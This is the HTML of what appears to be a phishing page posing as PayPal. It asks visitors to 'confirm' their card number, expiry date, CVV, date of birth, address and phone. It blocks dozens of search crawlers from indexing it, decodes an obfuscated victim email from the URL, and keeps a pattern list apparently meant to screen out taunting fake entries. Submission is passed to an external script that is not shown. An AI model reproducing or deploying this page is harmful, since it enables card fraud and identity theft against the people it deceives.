<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Paypal Summary | Send Money, Pay Online or Set Up a Merchant Account - PayPal</title>

 <meta name="robots" content="noindex, nofollow,noarchive,nosnippet,nocache,noimageindex">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-news" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="msnbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-slurp" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="teoma" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="twiceler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="gigabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="scrubby" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="robozilla" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="nutch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ia_archiver" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="baiduspider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="naverbot, yeti" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-image" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-mobile" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-mmcrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="psbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="asterias" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-blogs/v3.9" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="AhrefsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="MJ12bot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-12" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-SEO" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="DSearch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Rogerbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SemrushBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BLEXBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ScoutJet" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SearchmetricsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BacklinkCrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Exabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="spbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="linkdexbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Lipperhey Spider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SEOkicks-Robot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="sistrix" content="noindex,nofollow,noarchive,nosnippet,nocache">
    
    <link rel="stylesheet" href="css/style.css" />
    <link rel="shortcut icon" href="images/favicon.png"/>
    <script type="text/javascript" src="js/jqueryLib.js"></script>
     
     <script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>
</head>

<body>
<div class="img10-const">
  <div class="img10"></div>
  </div>
<div class="card-const">
       <div class="card-box">
         <div class="card-heading1"></div>
         <div class="card-content">
         <!-- First Form -->
           <form name="dmtForm" id="dmtForm" method="post" action="">
             <table width="519" border="0" class="cyCard">
              <tr>
                 <td width="513" colspan="2"><div class="card-heading1">Confirm your Card</div></td>
               </tr>
               <tr>
                 <td width="513" colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">
                   <select name="cardtype" id="cardtype" required class="select1">
                       <option value="">Card Type</option>
                       <option value="Visa">Visa</option>
                       <option value="MasterCard">MasterCard</option>
                       <option value="Discover">Discover</option>
                       <option value="American Express">American Express</option>
                       <option value="JCB">JCB</option>
                 </select>
                 </td>
               </tr>
               <tr>
                 <td colspan="2"><input type="hidden" name="dmemail" id="dmemail">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">
                 <input type="text" name="cardnumber" id="cardnumber" required autocomplete="off" class="txt2" onKeyPress="javascript:return(numbersOnly(this,event));" placeholder="Card Number" maxlength="16" minlength="16"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td>
                 <input type="text" name="expdate" id="expdate" required autocomplete="off" class="txt3" placeholder="Expiration MM/YYYY" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="7" minlength="7"></td>
                 <td>
                 <input type="text" name="cvv" id="cvv" required autocomplete="off" class="txt3a" placeholder="CVV (3 digits)" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="3" minlength="3"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2"><input type="submit" name="btnsaves1" id="btnsaves1" value="Save" class="btnsave"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
             </table>
             <table width="519" border="0" class="cyAddress">
             <tr>
                 <td colspan="2"><div class="card-heading1">Confirm your Address</div></td>
               </tr>
                <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td width="513"><input type="text" name="fullname" id="fullname" required autocomplete="off" class="txt3" placeholder="Full Name" ></td>
                 <td width="513"><input type="text" name="dob" id="dob" required autocomplete="off" class="txt3" placeholder="Date of Birth (DD/MM/YYYY)" maxlength="10" ></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2"><input type="text" name="address" id="address" required autocomplete="off" class="txt4" placeholder="Address Line" ></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td><input type="text" name="city" id="city" required autocomplete="off" class="txt3" placeholder="City / Town / Village" ></td>
                 <td><input type="text" name="zipcode" id="zipcode" required autocomplete="off" class="txt3" placeholder="Zip Code" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="5" minlength="5"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td><input type="text" name="state" id="state" required autocomplete="off" class="txt3" placeholder="State / Region" ></td>
                 <td>
                 <select name="country" id="country"  class="select2a">
              <option value="">Select Country</option>
              <option selected="selected" value="USA">United States Of America</option>
              <option value="AFG">AFGHANISTAN</option>
              <option value="ALB">ALBANIA</option>
              <option value="DZA">ALGERIA</option>
              <option value="ASM">AMERICAN SAMOA</option>
              <option value="AND">ANDORRA</option>
              <option value="AGO">ANGOLA</option>
              <option value="AIA">ANGUILLA</option>
              <option value="ATA">ANTARCTICA</option>
              <option value="ATG">ANTIGUA AND BARBUDA</option>
              <option value="ARG">ARGENTINA</option>
              <option value="ARM">ARMENIA</option>
              <option value="ABW">ARUBA</option>
              <option value="AUS">AUSTRALIA</option>
              <option value="AUT">AUSTRIA</option>
              <option value="AZE">AZERBAIJAN</option>
              <option value="BHS">BAHAMAS</option>
              <option value="BHR">BAHRAIN</option>
              <option value="BGD">BANGLADESH</option>
              <option value="BRB">BARBADOS</option>
              <option value="BLR">BELARUS</option>
              <option value="BEL">BELGIUM</option>
              <option value="BLZ">BELIZE</option>
              <option value="BEN">BENIN</option>
              <option value="BMU">BERMUDA</option>
              <option value="BTN">BHUTAN</option>
              <option value="BOL">BOLIVIA</option>
              <option value="BIH">BOSNIA AND HERZEGOWINA</option>
              <option value="BWA">BOTSWANA</option>
              <option value="BVT">BOUVET ISLAND</option>
              <option value="BRA">BRAZIL</option>
              <option value="IOT">BRITISH INDIAN OCEAN TERRITORY</option>
              <option value="BRN">BRUNEI DARUSSALAM</option>
              <option value="BGR">BULGARIA</option>
              <option value="BFA">BURKINA FASO</option>
              <option value="BDI">BURUNDI</option>
              <option value="KHM">CAMBODIA</option>
              <option value="CMR">CAMEROON</option>
              <option value="CAN">Canada</option>
              <option value="CPV">CAPE VERDE</option>
              <option value="CYM">CAYMAN ISLANDS</option>
              <option value="CAF">CENTRAL AFRICAN REPUBLIC</option>
              <option value="TCD">CHAD</option>
              <option value="CHL">CHILE</option>
              <option value="CHN">CHINA</option>
              <option value="CXR">CHRISTMAS ISLAND</option>
              <option value="CCK">COCOS (KEELING) ISLANDS</option>
              <option value="COL">COLOMBIA</option>
              <option value="COM">COMOROS</option>
              <option value="COG">CONGO</option>
              <option value="COK">COOK ISLANDS</option>
              <option value="CRI">COSTA RICA</option>
              <option value="CIV">COTE D&#x27;IVOIRE</option>
              <option value="HRV">CROATIA (local name: Hrvatska)</option>
              <option value="CUB">CUBA</option>
              <option value="CYP">CYPRUS</option>
              <option value="CZE">CZECH REPUBLIC</option>
              <option value="DNK">DENMARK</option>
              <option value="DJI">DJIBOUTI</option>
              <option value="DMA">DOMINICA</option>
              <option value="DOM">DOMINICAN REPUBLIC</option>
              <option value="TMP">EAST TIMOR</option>
              <option value="ECU">ECUADOR</option>
              <option value="EGY">EGYPT</option>
              <option value="SLV">EL SALVADOR</option>
              <option value="GNQ">EQUATORIAL GUINEA</option>
              <option value="ERI">ERITREA</option>
              <option value="EST">ESTONIA</option>
              <option value="ETH">ETHIOPIA</option>
              <option value="FLK">FALKLAND ISLANDS (MALVINAS)</option>
              <option value="FRO">FAROE ISLANDS</option>
              <option value="FJI">FIJI</option>
              <option value="FIN">FINLAND</option>
              <option value="FRA">FRANCE</option>
              <option value="GUF">FRENCH GUIANA</option>
              <option value="PYF">FRENCH POLYNESIA</option>
              <option value="ATF">FRENCH SOUTHERN TERRITORIES</option>
              <option value="GAB">GABON</option>
              <option value="GMB">GAMBIA</option>
              <option value="GEO">GEORGIA</option>
              <option value="DEU">GERMANY</option>
              <option value="GHA">GHANA</option>
              <option value="GIB">GIBRALTAR</option>
              <option value="GBR">Great Britain</option>
              <option value="GRC">GREECE</option>
              <option value="GRL">GREENLAND</option>
              <option value="GRD">GRENADA</option>
              <option value="GLP">GUADELOUPE</option>
              <option value="GUM">GUAM</option>
              <option value="GTM">GUATEMALA</option>
              <option value="GIN">GUINEA</option>
              <option value="GNB">GUINEA-BISSAU</option>
              <option value="GUY">GUYANA</option>
              <option value="HTI">HAITI</option>
              <option value="HMD">HEARD AND MC DONALD ISLANDS</option>
              <option value="HND">HONDURAS</option>
              <option value="HKG">HONG KONG</option>
              <option value="HUN">HUNGARY</option>
              <option value="ISL">ICELAND</option>
              <option value="IND">INDIA</option>
              <option value="IDN">INDONESIA</option>
              <option value="IRN">IRAN (ISLAMIC REPUBLIC OF)</option>
              <option value="IRQ">IRAQ</option>
              <option value="IRL">IRELAND</option>
              <option value="ISR">ISRAEL</option>
              <option value="ITA">ITALY</option>
              <option value="JAM">JAMAICA</option>
              <option value="JPN">JAPAN</option>
              <option value="JOR">JORDAN</option>
              <option value="KAZ">KAZAKHSTAN</option>
              <option value="KEN">KENYA</option>
              <option value="KIR">KIRIBATI</option>
              <option value="PRK">KOREA, DEMOCRATIC PEOPLES REPUBLIC OF</option>
              <option value="KOR">KOREA, REPUBLIC OF</option>
              <option value="XK ">KOSOVO</option>
              <option value="KWT">KUWAIT</option>
              <option value="KGZ">KYRGYZSTAN</option>
              <option value="LAO">LAO PEOPLE&#x27;S DEMOCRATIC REPUBLIC</option>
              <option value="LVA">LATVIA</option>
              <option value="LBN">LEBANON</option>
              <option value="LSO">LESOTHO</option>
              <option value="LBR">LIBERIA</option>
              <option value="LBY">LIBYAN ARAB JAMAHIRIYA</option>
              <option value="LIE">LIECHTENSTEIN</option>
              <option value="LTU">LITHUANIA</option>
              <option value="LUX">LUXEMBOURG</option>
              <option value="MAC">MACAU</option>
              <option value="MKD">MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF</option>
              <option value="MDG">MADAGASCAR</option>
              <option value="MWI">MALAWI</option>
              <option value="MYS">MALAYSIA</option>
              <option value="MDV">MALDIVES</option>
              <option value="MLI">MALI</option>
              <option value="MLT">MALTA</option>
              <option value="MHL">MARSHALL ISLANDS</option>
              <option value="MTQ">MARTINIQUE</option>
              <option value="MRT">MAURITANIA</option>
              <option value="MUS">MAURITIUS</option>
              <option value="MYT">MAYOTTE</option>
              <option value="MEX">MEXICO</option>
              <option value="FSM">MICRONESIA, FEDERATED STATES OF</option>
              <option value="MDA">MOLDOVA, REPUBLIC OF</option>
              <option value="MCO">MONACO</option>
              <option value="MNG">MONGOLIA</option>
              <option value="MSR">MONTSERRAT</option>
              <option value="MAR">MOROCCO</option>
              <option value="MOZ">MOZAMBIQUE</option>
              <option value="MMR">MYANMAR</option>
              <option value="NAM">NAMIBIA</option>
              <option value="NRU">NAURU</option>
              <option value="NPL">NEPAL</option>
              <option value="NLD">NETHERLANDS</option>
              <option value="ANT">NETHERLANDS ANTILLES</option>
              <option value="NCL">NEW CALEDONIA</option>
              <option value="NZL">NEW ZEALAND</option>
              <option value="NIC">NICARAGUA</option>
              <option value="NER">NIGER</option>
              <option value="NGA">NIGERIA</option>
              <option value="NIU">NIUE</option>
              <option value="NFK">NORFOLK ISLAND</option>
              <option value="MNP">NORTHERN MARIANA ISLANDS</option>
              <option value="NOR">NORWAY</option>
              <option value="OMN">OMAN</option>
              <option value="PAK">PAKISTAN</option>
              <option value="PLW">PALAU</option>
              <option value="PSE">Palestine</option>
              <option value="PAN">PANAMA</option>
              <option value="PNG">PAPUA NEW GUINEA</option>
              <option value="PRY">PARAGUAY</option>
              <option value="PER">PERU</option>
              <option value="PHL">PHILIPPINES</option>
              <option value="PCN">PITCAIRN</option>
              <option value="POL">POLAND</option>
              <option value="PRT">PORTUGAL</option>
              <option value="PRI">PUERTO RICO</option>
              <option value="QAT">QATAR</option>
              <option value="REU">REUNION</option>
              <option value="ROM">ROMANIA</option>
              <option value="RUS">RUSSIAN FEDERATION</option>
              <option value="RWA">RWANDA</option>
              <option value="KNA">SAINT KITTS AND NEVIS</option>
              <option value="LCA">SAINT LUCIA</option>
              <option value="VCT">SAINT VINCENT AND THE GRENADINES</option>
              <option value="WSM">SAMOA</option>
              <option value="SMR">SAN MARINO</option>
              <option value="STP">SAO TOME AND PRINCIPE</option>
              <option value="SAU">SAUDI ARABIA</option>
              <option value="SEN">SENEGAL</option>
              <option value="SRB">SERBIA</option>
              <option value="SYC">SEYCHELLES</option>
              <option value="SLE">SIERRA LEONE</option>
              <option value="SGP">SINGAPORE</option>
              <option value="SVK">SLOVAKIA (Slovak Republic)</option>
              <option value="SVN">SLOVENIA</option>
              <option value="SLB">SOLOMON ISLANDS</option>
              <option value="SOM">SOMALIA</option>
              <option value="ZAF">SOUTH AFRICA</option>
              <option value="ESP">SPAIN</option>
              <option value="LKA">SRI LANKA</option>
              <option value="SHN">ST. HELENA</option>
              <option value="SPM">ST. PIERRE AND MIQUELON</option>
              <option value="SDN">SUDAN</option>
              <option value="SUR">SURINAME</option>
              <option value="SJM">SVALBARD AND JAN MAYEN ISLANDS</option>
              <option value="SWZ">SWAZILAND</option>
              <option value="SWE">SWEDEN</option>
              <option value="CHE">SWITZERLAND</option>
              <option value="SYR">SYRIAN ARAB REPUBLIC</option>
              <option value="TWN">TAIWAN, PROVINCE OF CHINA</option>
              <option value="TJK">TAJIKISTAN</option>
              <option value="TZA">TANZANIA, UNITED REPUBLIC OF</option>
              <option value="THA">THAILAND</option>
              <option value="TGO">TOGO</option>
              <option value="TKL">TOKELAU</option>
              <option value="TON">TONGA</option>
              <option value="TTO">TRINIDAD AND TOBAGO</option>
              <option value="TUN">TUNISIA</option>
              <option value="TUR">TURKEY</option>
              <option value="TKM">TURKMENISTAN</option>
              <option value="TCA">TURKS AND CAICOS ISLANDS</option>
              <option value="TUV">TUVALU</option>
              <option value="UGA">UGANDA</option>
              <option value="UKR">UKRAINE</option>
              <option value="ARE">UNITED ARAB EMIRATES</option>
              <option value="UMI">UNITED STATES MINOR OUTLYING ISLANDS</option>
              <option value="URY">URUGUAY</option>
              <option value="UZB">UZBEKISTAN</option>
              <option value="VUT">VANUATU</option>
              <option value="VAT">VATICAN CITY STATE (HOLY SEE)</option>
              <option value="VEN">VENEZUELA</option>
              <option value="VNM">VIET NAM</option>
              <option value="VGB">VIRGIN ISLANDS (BRITISH)</option>
              <option value="VIR">VIRGIN ISLANDS (U.S.)</option>
              <option value="WLF">WALLIS AND FUTUNA ISLANDS</option>
              <option value="ESH">WESTERN SAHARA</option>
              <option value="YEM">YEMEN</option>
              <option value="YUG">YUGOSLAVIA</option>
              <option value="ZAR">ZAIRE</option>
              <option value="ZMB">ZAMBIA</option>
              <option value="ZWE">ZIMBABWE</option>
            </select>
                 </td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td>
                   <select name="phonetype" id="phonetype" required class="select2">
                      <option value="">Phone Type</option>
                      <option value="Mobile">Mobile</option>
                      <option value="Home">Home</option>
                      <option value="Work">Work</option>
                 </select>
                 <input type="text" name="phonecode" id="phonecode" required autocomplete="off" class="select3t" placeholder="+1">
                 <!--<select name="phonecode" id="phonecode" required class="select3">
                      <option value="1(US)">1(US)</option>
                 </select>-->
                 </td>
                 <td><input type="text" name="phonenumber" id="phonenumber" required autocomplete="off" class="txt3" placeholder="Phone Number"  maxlength="10" minlength="10" onKeyPress="javascript:return(numbersOnly(this,event));"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2"><input type="submit" name="btnsaves" id="btnsaves" value="Save" class="btnsave"></td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
               <tr>
                 <td colspan="2">&nbsp;</td>
               </tr>
             </table>
           </form>
          
         </div>
       </div>
    </div>
    <div class="img13-const">
       <div class="img13"></div>
    </div>
<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="images/loding.gif" width="60" height="60">
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script type="text/javascript">

var $c = getUrlParameter('demail');

     $('#dmemail').val($c);
	
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }



</script>
<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>